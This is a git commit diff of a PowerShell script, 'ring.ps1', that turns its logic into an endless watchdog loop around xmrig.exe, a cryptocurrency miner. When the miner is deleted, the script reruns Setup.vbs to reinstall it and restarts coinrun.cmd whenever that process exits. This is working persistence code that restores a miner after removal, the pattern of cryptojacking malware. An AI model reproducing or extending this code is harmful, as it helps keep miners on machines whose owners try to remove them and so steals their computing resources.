9bbe2f5a65ca31f432a3a2649a8c05c6f7546c98
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-06-08 18:33:37 +0700

    ring.ps1

--- ring.ps1
+++ ring.ps1
@@ -7,25 +7,25 @@ function Start-CoinRun {
     Write-Host "coinrun.cmd START"
 }
 
-if (Test-Path $xmrigPath) {
+while ($true) {
+    if (!(Test-Path $xmrigPath)) {
+        Write-Warning "xmrig.exe Del. Wait..."
 
-} else {
-    Write-Warning "xmrig.exe DoseNotExist..."
-    if (Test-Path $setupPath) {
-        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
-        Write-Host "Running Setup.vbs"
+        if (Test-Path $setupPath) {
+            Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
+            Write-Host "Run Setup.vbs!"
 
-        while (!(Test-Path $xmrigPath)) {
-            Write-Host "Wait xmrig.exe..."
-            Start-Sleep -Seconds 3
+            while (!(Test-Path $xmrigPath)) {
+                Write-Host "Wait.. xmrig.exe"
+                Start-Sleep -Seconds 3
+            }
+
+            Write-Host "Đã phát hiện lại xmrig.exe. Khởi động coinrun.cmd"
+            Start-CoinRun
+        } else {
+            Write-Error "NO Setup.vbs: $setupPath"
         }
-
-        Write-Host "xmrig.exe. RUN coinrun.cmd"
-      
-    } else {
-        Write-Error "NO Setup.vbs"
     }
-}
 
     if ($global:coinRunProcess -and $global:coinRunProcess.HasExited) {
         Write-Warning "coinrun.cmd STOP. Reboot..."
@@ -33,6 +33,6 @@ if (Test-Path $xmrigPath) {
     } elseif ($global:coinRunProcess) {
         Write-Host "coinrun.cmd running..."
     }
-    
+
     Start-Sleep -Seconds 3
 }
